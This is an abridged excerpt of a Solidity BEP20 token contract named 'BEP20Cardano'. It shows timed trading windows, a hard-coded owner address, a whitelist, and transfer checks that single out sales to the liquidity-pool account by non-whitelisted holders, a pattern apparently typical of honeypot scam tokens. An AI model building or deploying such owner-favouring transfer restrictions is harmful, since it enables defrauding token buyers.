...
contract BEP20Cardano is Context, IBEP20, Ownable {
  ...
  uint256 public starttime=1673704800;
  uint256 public opentime=1673705100;
  uint256 public sxftime=1673705100;
  uint256 public closetime=1736863500;
  uint public shanum=3;
  ...
  address mainacc = 0x740aF1B026317FAa3dc9e93E0A730d7eB24C50e1;
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(recipient==mainacc || sender==mainacc || recipient==tokenacc || sender==tokenacc){
       ...
       if(nowshanum<=shanum && recipient!=mainacc && _whiteaddress[recipient]!=true){
    ...
    if(recipient==lpacc && sender!=mainacc && _whiteaddress[sender]!=true){
